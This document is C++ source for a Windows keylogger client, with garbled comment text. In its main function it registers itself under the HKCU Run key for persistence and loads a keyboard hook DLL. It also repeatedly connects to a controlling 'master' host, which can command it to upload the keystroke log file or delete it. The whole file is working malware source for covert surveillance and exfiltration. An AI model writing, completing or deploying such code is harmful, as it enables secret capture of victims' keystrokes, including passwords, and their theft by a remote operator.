#include <windows.h>
#include <iostream>
#include <Winsock.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <conio.h>
using namespace std;
#pragma comment(lib, "wsock32.lib")

//������������ַ����**************************
char masterIP[20] = "127.0.0.1";
#define masterPORT 12345 
//*********************************************

typedef VOID(*pfnUnhookKbdHook)();
typedef BOOL(*pfnSetKbdHook)();

SOCKET sockMonitor;
sockaddr_in masterAddr;				//master��ַ 
int addrLen;		//��ַ����
char order[20];		//����
char rbuff[1024];	//���ջ�����
char sbuff[1024];	//���ͻ�����

//***************��������***************
DWORD InitSock();
int sendFile(SOCKET datatcps, FILE* file);
DWORD connectProcess();
//***************��������***************

//��ʼ��winsock
DWORD InitSock() {
	WSADATA WSAData;
	if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0) {
		cout << "��ʼ��ʧ��" << endl;
		return -1;
	}

	//����master��ַ
	masterAddr.sin_family = AF_INET;					//�����ײ���ʹ�õ�����ͨ��Э�����ݽ����ݵģ�AF_INET��ʾʹ�� TCP/IPv4 ��ַ�����ͨ��
	masterAddr.sin_addr.s_addr = inet_addr(masterIP);	//ָ��������IP��ʮ����ת���ɶ�����IPV4��ַ
	masterAddr.sin_port = htons(masterPORT);			//���ö˿ںţ�htons���ڽ������ֽ����Ϊ�����ֽ���

	return 1;
}

DWORD connectProcess() {
	memset(rbuff, 0, sizeof(rbuff));
	memset(sbuff, 0, sizeof(sbuff));

	cout << "����Զ�̷�������" << endl;
	while (TRUE)
	{
		sockMonitor = socket(AF_INET, SOCK_STREAM, 0);
		if (sockMonitor == SOCKET_ERROR) {
			cout << "����ʧ��" << endl;
			WSACleanup();
			return -1;
		}
		if (connect(sockMonitor, (struct sockaddr*)&masterAddr, sizeof(masterAddr)) == SOCKET_ERROR) {
			cout << "����ʧ�ܣ�׼������..." << endl;
			continue;
		}
		cout << "���ӳɹ����ȴ���������..." << endl;
		int cnt = recv(sockMonitor, rbuff, sizeof(rbuff), 0);
		cout << rbuff << endl;
		if (cnt > 0)
		{
			cout << endl << "��ȡ��ִ�е����" << rbuff << endl;

			//��ȡ��־���� get
			if (strncmp(rbuff, "get", 3) == 0) {
				FILE* file;
				//��ȡlog
				fopen_s(&file, "log.txt", "rb");//�����ƴ��ļ���ֻ�����
				if (file) {
					if (!sendFile(sockMonitor, file)) {
						cout << "����ʧ��" << endl;
						fclose(file);
						continue;
					}
					else {
						fclose(file);
						continue;
					}
				}
				else {
					strcpy_s(sbuff, "error");
					if (send(sockMonitor, sbuff, sizeof(sbuff), 0)) {
						continue;
					}
				}
			}
			//�����¼���� clean
			else if (strncmp(rbuff, "clean", 5) == 0) {
				if (DeleteFile(L"log.txt") == 0) {
					strcpy_s(sbuff, "ɾ���ɹ�\n");
					if (send(sockMonitor, sbuff, sizeof(sbuff), 0)) {
						continue;
					}
				}
				else {
					strcpy_s(sbuff, "ɾ��ʧ��\n");
					if (send(sockMonitor, sbuff, sizeof(sbuff), 0)) {
						continue;
					}
				}
			}
			else
			{
				cout << "δ֪����" << endl;
			}
		}
		closesocket(sockMonitor);  //�ر��׽���
		memset(rbuff, 0, sizeof(rbuff));
		memset(sbuff, 0, sizeof(sbuff));

	}
	return 0;
}

int sendFile(SOCKET datatcps, FILE* file) {
	cout << "���ڷ����ļ���" << endl;
	memset(sbuff, '\0', sizeof(sbuff));
	//���ļ���ѭ����ȡ���ݲ��������ͻ���
	while (TRUE) {
		int len = fread(sbuff, 1, sizeof(sbuff), file);//��fileָ��ָ����ļ��е����ݶ�ȡ��sbuff��
		if (send(datatcps, sbuff, len, 0) == SOCKET_ERROR) {
			cout << "����ʧ��" << endl;
			closesocket(datatcps);
			return 0;
		}
		if (feof(file)) {
			break;
		}
	}
	closesocket(datatcps);
	cout << "���ͳɹ�" << endl;
	return 1;
}

//�����̺߳���
DWORD connectToMaster(LPVOID lpParam)
{
	InitSock();
	while (TRUE) {
		connectProcess();
		Sleep(300);
	}
}

// ����������ע�ắ��
void HKRunator()   
{
	char* programName;
	_get_pgmptr(&programName);
	cout << programName << endl;

	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyExA(HKEY_CURRENT_USER,                      //����һ��ע�����������򿪸�ע�����
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,                  
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)
	{
		rc = RegSetValueExA(hkey,
			"LogWhatYouDid",
			0,
			REG_SZ,
			(const BYTE*)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			cout << "Success Registed" << endl;
			RegCloseKey(hkey);
		}
	}
	else
	{
		cout << "Failed" << endl;
	}
}

//HOOK�߳�
DWORD hookStill(LPVOID lpParam)
{
	HMODULE hMod = NULL;
	MSG msg;
	pfnUnhookKbdHook pfnUnhook = NULL;
	pfnSetKbdHook pfnHook = NULL;

	hMod = LoadLibraryA("hook.dll");
	if (hMod == NULL)
	{
		return(-1);
	}
	pfnHook = (pfnSetKbdHook)GetProcAddress(hMod, "SetKbdHook");
	if (pfnHook == NULL)
	{
		return(-1);
	}
	pfnHook();

	// ��Ϣѭ��
	while (GetMessage(&msg, NULL, 0, 0) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	pfnUnhook = (pfnUnhookKbdHook)GetProcAddress(hMod, "UnhookKbdHook");
	if (NULL == pfnUnhook)
	{
		return(-1);
	}
	pfnUnhook();
}

int main()
{
	//HWND hwnd = GetActiveWindow();
	//ShowWindow(hwnd, SW_HIDE);

	//���ÿ���������
	HKRunator();

	//���������߳�
	HANDLE connectThread;
	DWORD connectThreadID = 0;
	connectThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)connectToMaster, 0, 0, &connectThreadID);

	//HOOK�߳�
	HANDLE hookThread;
	DWORD hookThreadID = 1;
	hookThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hookStill, 0, 0, &hookThreadID);

	system("pause");

	return(0);
}